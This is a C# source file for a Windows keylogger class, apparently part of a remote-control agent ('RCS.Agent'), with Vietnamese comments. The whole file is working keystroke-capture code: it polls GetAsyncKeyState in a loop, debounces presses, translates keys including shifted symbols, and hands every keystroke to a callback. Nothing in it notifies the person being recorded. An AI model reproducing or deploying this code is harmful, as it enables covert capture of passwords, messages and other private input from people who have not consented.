using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms; 

namespace RCS.Agent.Services.Windows
{
    public class Keylogger
    {
        private CancellationTokenSource _cts;
        private Action<string> _onKeyPressed;

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        // Mảng lưu trạng thái
        private readonly bool[] _prevKeyStates = new bool[256];
        private readonly DateTime[] _lastPressTimes = new DateTime[256];
        private readonly DateTime[] _lastReleaseTimes = new DateTime[256];
        
        // Cấu hình độ trễ
        private const int REPEAT_DELAY_MS = 600; 
        private const int REPEAT_INTERVAL_MS = 200; 
        
        // SỬA: Tăng thời gian chống nảy lên 100ms để tránh bị double khi chạm nhẹ
        private const int DEBOUNCE_TIME_MS = 100; 

        public void Start(Action<string> onKeyPressed)
        {
            if (_cts != null) return;
            _cts = new CancellationTokenSource();
            _onKeyPressed = onKeyPressed;

            Array.Clear(_prevKeyStates, 0, _prevKeyStates.Length);
            Array.Clear(_lastPressTimes, 0, _lastPressTimes.Length);
            Array.Clear(_lastReleaseTimes, 0, _lastReleaseTimes.Length);

            Task.Run(async () => await RealKeylogLoop(_cts.Token));
        }

        public void Stop()
        {
            _cts?.Cancel();
            _cts = null;
        }

        private async Task RealKeylogLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                for (int i = 8; i < 256; i++)
                {
                    bool isDown = (GetAsyncKeyState(i) & 0x8000) != 0;
                    bool wasDown = _prevKeyStates[i];
                    var now = DateTime.Now;

                    if (isDown)
                    {
                        if (!wasDown) // TRƯỜNG HỢP 1: Nhấn mới
                        {
                            double msSinceRelease = (now - _lastReleaseTimes[i]).TotalMilliseconds;
                            
                            // Chỉ xử lý nếu không phải là nảy phím
                            if (msSinceRelease > DEBOUNCE_TIME_MS)
                            {
                                ProcessKey(i);
                            }

                            // Reset thời gian chờ lặp lại
                            _lastPressTimes[i] = now.AddMilliseconds(REPEAT_DELAY_MS); 
                        }
                        else if (now > _lastPressTimes[i]) // TRƯỜNG HỢP 2: Giữ phím (Repeat)
                        {
                            ProcessKey(i);
                            _lastPressTimes[i] = now.AddMilliseconds(REPEAT_INTERVAL_MS); 
                        }
                        _prevKeyStates[i] = true;
                    }
                    else
                    {
                        if (wasDown) _lastReleaseTimes[i] = now;
                        _prevKeyStates[i] = false;
                    }
                }
                await Task.Delay(20, token);
            }
        }

        private void ProcessKey(int vKey)
        {
            Keys key = (Keys)vKey;

            // SỬA: Bỏ qua các mã phím chung (Generic) để tránh trùng lặp với phím trái/phải
            // 16 = Shift, 17 = Control, 18 = Alt (Menu)
            if (key == Keys.ShiftKey || key == Keys.ControlKey || key == Keys.Menu) return;

            string keyStr = "";

            // Bỏ qua chuột
            if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) return;

            // --- Xử lý hiển thị cho các phím chức năng ---
            
            // 1. Modifier Keys (Chỉ bắt các phím Left/Right cụ thể)
            if (key == Keys.LShiftKey || key == Keys.RShiftKey) keyStr = "[SHIFT]";
            else if (key == Keys.LControlKey || key == Keys.RControlKey) keyStr = "[CTRL]";
            else if (key == Keys.LMenu || key == Keys.RMenu) keyStr = "[ALT]";
            else if (key == Keys.LWin || key == Keys.RWin) keyStr = "[WIN]";

            // 2. Special Keys
            else if (key == Keys.Enter) keyStr = "\n[ENTER]\n";
            else if (key == Keys.Space) keyStr = " ";
            else if (key == Keys.Back) keyStr = "[BACK]";
            else if (key == Keys.Tab) keyStr = "[TAB]";
            else if (key == Keys.Escape) keyStr = "[ESC]";
            else if (key == Keys.Delete) keyStr = "[DEL]";
            else if (key == Keys.CapsLock) keyStr = "[CAPS]";

            // 3. Ký tự chữ và số
            else if (key.ToString().Length == 1)
            {
                bool shift = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                bool caps = (GetKeyState((int)Keys.CapsLock) & 1) != 0;
                
                if (key >= Keys.A && key <= Keys.Z)
                {
                    if (shift ^ caps) keyStr = key.ToString().ToUpper();
                    else keyStr = key.ToString().ToLower();
                }
                else if (key >= Keys.D0 && key <= Keys.D9)
                {
                     // Xử lý Shift + Số -> Ký tự đặc biệt
                     if (shift) keyStr = GetShiftNumberChar(key);
                     else keyStr = key.ToString().Replace("D", "");
                }
                else
                {
                    keyStr = key.ToString();
                }
            }
            else
            {
                // Các phím còn lại (F1-F12...)
                keyStr = $"[{key}]";
            }

            if (!string.IsNullOrEmpty(keyStr))
            {
                _onKeyPressed?.Invoke(keyStr);
            }
        }

        // Helper: Map phím số sang ký tự đặc biệt khi giữ Shift
        private string GetShiftNumberChar(Keys key)
        {
            switch (key)
            {
                case Keys.D1: return "!";
                case Keys.D2: return "@";
                case Keys.D3: return "#";
                case Keys.D4: return "$";
                case Keys.D5: return "%";
                case Keys.D6: return "^";
                case Keys.D7: return "&";
                case Keys.D8: return "*";
                case Keys.D9: return "(";
                case Keys.D0: return ")";
                default: return key.ToString().Replace("D", "");
            }
        }
    }
}